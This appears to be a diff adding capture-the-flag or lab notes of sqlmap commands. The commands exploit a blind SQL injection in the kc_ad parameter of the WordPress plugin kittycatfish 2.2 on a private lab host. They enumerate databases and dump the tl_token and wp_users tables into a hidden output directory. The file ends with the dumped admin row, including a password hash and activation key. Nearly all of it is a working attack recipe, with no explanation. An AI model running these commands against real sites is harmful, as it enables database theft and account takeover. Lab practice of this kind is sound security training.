@@ -1,0 +1,15 @@
+./sqlmap.py -v 3 -u 'http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16&ver=2.0' --batch --dbms=MySQL --threads=10 --random-agent --dbs --level 5 --risk 3 --technique=B -p kc_ad --output-dir=/var/tmp/.rfslf
+
+/sqlmap.py -v 3 -u 'http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16&ver=2.0' --batch --dbms=MySQL --threads=10 --random-agent --level 5 --risk 3 --technique=B -p kc_ad -D testlabdb --tables --output-dir=/var/tmp/.rfslf
+
+./sqlmap.py -v 3 -u 'http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16&ver=2.0' --batch --dbms=MySQL --threads=10 --random-agent --level 5 --risk 3 --technique=B -p kc_ad -D testlabdb -T tl_token --dump --output-dir=/var/tmp/.rfslf
+
+Site_on_dark_side
+
+./sqlmap.py -v 3 -u 'http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16&ver=2.0' --batch --dbms=MySQL --threads=10 --random-agent --level 5 --risk 3 --technique=B -p kc_ad -D testlabdb -T wp_users --dump --output-dir=/var/tmp/.rfslf
+
++----+----------+------------------------------------+------------+----------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+| ID | user_url | user_pass                          | user_login | user_email     | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
++----+----------+------------------------------------+------------+----------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+| 1  | <blank>  | $P$BZDm7sK8rozioz3Wjeq5Shc7qupg270 | labadmin   | admin@test.lab | 0           | labadmin     | labadmin      | 2017-06-30 12:58:59 | 1499760384:$P$BA5BsXvO1X9Rz4Q.csomIpflVo882S/ |
++----+----------+------------------------------------+------------+----------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
